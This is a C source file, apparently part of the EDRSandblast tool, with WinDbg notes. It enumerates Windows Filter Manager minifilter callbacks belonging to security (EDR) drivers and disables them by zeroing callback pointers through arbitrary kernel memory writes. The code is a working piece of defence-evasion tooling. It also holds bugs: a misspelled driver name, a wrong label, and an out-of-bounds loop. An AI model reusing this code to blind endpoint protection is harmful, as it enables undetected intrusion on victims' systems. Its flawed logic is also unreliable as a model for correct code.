/*
 * FltGlobals + 0x58 + 0x68 (_GLOBALS.FrameList.rList) => _FLTP_FRAME.Links
dps fltmgr!FltGlobals + 0xC0 l1

dt fltmgr!_FLTP_FRAME ffff9e81`25cd0028-8
  > (_FLTP_FRAME.Links-8)

 * _FLTP_FRAME.RegisteredFilters.rList => _FLT_FILTER.Base.PrimaryLink
dps poi(fltmgr!FltGlobals + 0xC0)-8+48+68 l3
dt fltmgr!_FLT_FILTER ffff9e81`25cd0020-10
  > _FLT_FILTER.Base.PrimaryLink-10

dps ffff9e81`25d8e028-10+68+68 l3
  > _FLT_FILTER.InstanceList.rList => _FLT_INSTANCE.FilterLink

dt fltmgr!_FLT_INSTANCE ffff9e81`25cd0020-70
  > _FLT_FILTER.InstanceList.rList - 70

 * _FLTP_FRAME.AttachedVolumes.rList => _FLT_VOLUME.Base.PrimaryLink
dps poi(fltmgr!FltGlobals + 0xC0)-8+c8+68 l3
dt fltmgr!_FLT_VOLUME ffff9e81`25cd0020-10
  > _FLT_VOLUME.Base.PrimaryLink-10

dps ffff9e81`25d8e028-10+a0+68 l3
  > _FLT_VOLUME.InstanceList.rList => _FLT_INSTANCE.Base.PrimaryLink
  > Different from _FLT_FILTER.InstanceList.rList

dt fltmgr!_FLT_INSTANCE ffff9e81`25cd0020-10
  > _FLT_VOLUME.InstanceList.rList - 10

 */
#include <Tchar.h>
#include <Windows.h>

#include "../EDRSandblast.h"
#include "IsEDRChecks.h"
#include "PdbSymbols.h"
#include "FltmgrOffsets.h"
#include "KernelMemoryPrimitives.h"
#include "KernelUtils.h"
#include "FileVersion.h"
#include "KernelCallbacks.h"

#include "MinifilterCallbacks.h"

TCHAR const* FLTMGR_DRIVER = _T("flgmgr.sys");
DWORD64 BaseAddr = 0;

#define ReadDWORD64(offset) ReadMemoryDWORD64(BaseAddr + ## offset ##)

BOOL EnumMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks) {
  if (!FltmgrOffsetsArePresent()) {
    _putts_or_not(TEXT("FltMgr offsets not loaded ! Aborting..."));
    return FALSE;
  }

  BaseAddr = FindDriverBaseAddress(FLTMGR_DRIVER);
  if (BaseAddr == 0) {
    _putts_or_not(TEXT("Base address of fltMgr.sys can not be found! Aborting..."));
    return FALSE;
  }

  BOOL found = FALSE;

  _putts_or_not(TEXT("[+] Enumerating Minifilter callbacks"));
  const DWORD64 pFLTP_FRAME__Links = g_fltmgrOffsets[FLTOS_FltGlobals] + g_fltmgrOffsets[FLTOS_GLOBALS__FrameList] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rList];
  const DWORD64 FLTP_FRAME__Links = ReadDWORD64(pFLTP_FRAME__Links);
  const DWORD64 FLTP_FRAME = FLTP_FRAME__Links - g_fltmgrOffsets[FLTOS_FLTP_FRAME__Links];

  DWORD64 FLT_FILTER_head = FLTP_FRAME + g_fltmgrOffsets[FLTOS_FLTP_FRAME__RegisteredFilters] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rList];

  for(
      DWORD64 FLT_FILTER_Base_PrimaryLink = ReadDWORD64(FLT_FILTER_head);
      FLT_FILTER_Base_PrimaryLink != FLT_FILTER_head;
      FLT_FILTER_Base_PrimaryLink = ReadDWORD64(FLT_FILTER_Base_PrimaryLink)
      ) {
    DWORD64 FLT_FILTER = FLT_FILTER_Base_PrimaryLink - g_fltmgrOffsets[FLTOS_OBJECT_PrimaryLink];
    DWORD64 FLT_FILTER__DriverObject = ReadDWORD64(FLT_FILTER + g_fltmgrOffsets[FLTOS_FLT_FILTER__DriverObject]);
    DWORD64 DriverStart = ReadDWORD64(FLT_FILTER__DriverObject + g_fltmgrOffsets[FLTOS_DriverObject__DriverStart]);
    TCHAR * szDriver = GetDriverName(DriverStart);
    if (!isDriverNameMatchingEDR(szDriver)) continue;
    _tprintf_or_not(TEXT("[+] Filter Driver: %p\n"), szDriver);

    DWORD64 FLT_INSTANCE_head = FLT_FILTER + g_fltmgrOffsets[FLTOS_FLT_FILTER__InstanceList] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rList];

    for(
        DWORD64 FLT_INSTANCE__FilterLink = ReadDWORD64(FLT_INSTANCE_head);
        FLT_INSTANCE__FilterLink != FLT_INSTANCE_head;
        FLT_INSTANCE__FilterLink = ReadDWORD64(FLT_INSTANCE__FilterLink)
        ) {
      DWORD64 FLT_INSTANCE = FLT_INSTANCE__FilterLink - g_fltmgrOffsets[FLTOS_FLT_INSTANCE__FilterLink];
      DWORD64 CallbackNodes = FLT_INSTANCE + g_fltmgrOffsets[FLTOS_FLT_INSTANCE__CallbackNodes];

      for (int i = 0; i < 0x32; i++) {
        DWORD64 CallbackNode = ReadDWORD64(CallbackNodes + sizeof(PVOID) * i);
        if (!CallbackNode) continue;

        PVOID list[2][2] = {
          {(PVOID)g_fltmgrOffsets[FLTOS_CALLBACK_NODE__PreOperation], TEXT("PreOperation")},
          {(PVOID)g_fltmgrOffsets[FLTOS_CALLBACK_NODE__PostOperation], TEXT("PreOperation")}
        };

        for (int j = 0; j < sizeof(list); j++) {
          PVOID* item = list[j];
          DWORD64 callback = ReadDWORD64((DWORD64)item[0]);
          if (!callback) continue;
          _tprintf_or_not(TEXT("[+] [%s] 0x%016llx \n"), (TCHAR *)item[1], callback);

          struct KRNL_CALLBACK* cb = &FoundObjectCallbacks->EDR_CALLBACKS[FoundObjectCallbacks->index];
          cb->type = MINIFILTER_CALLBACK;
          cb->driver_name = szDriver;
          cb->removed = FALSE;
          cb->callback_func = callback;
          cb->addresses.minifilter_callback.callback_addr = (DWORD64)item[0];
          FoundObjectCallbacks->index++;
          found |= TRUE;
        }
      }
    }
  }

  return found;
}

void EnableDisableMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks, BOOL enable) {
  for (DWORD64 i = 0; i < FoundObjectCallbacks->index; i++) {
    struct KRNL_CALLBACK* cb = &FoundObjectCallbacks->EDR_CALLBACKS[i];
    if (cb->type == MINIFILTER_CALLBACK && cb->removed == enable) {
      _tprintf_or_not(TEXT("[+] [MinifilterCallblacks]\t%s %s callback...\n"), enable ? TEXT("Enabling") : TEXT("Disabling"), cb->driver_name);
      WriteMemoryDWORD64(cb->addresses.minifilter_callback.callback_addr, enable ? cb->callback_func : 0);
      cb->removed = !cb->removed;
    }
  }
}

void DisableMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks) {
  EnableDisableMinifilterCallbacks(FoundObjectCallbacks, FALSE);
}

void EnableMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks) {
  EnableDisableMinifilterCallbacks(FoundObjectCallbacks, TRUE);
}
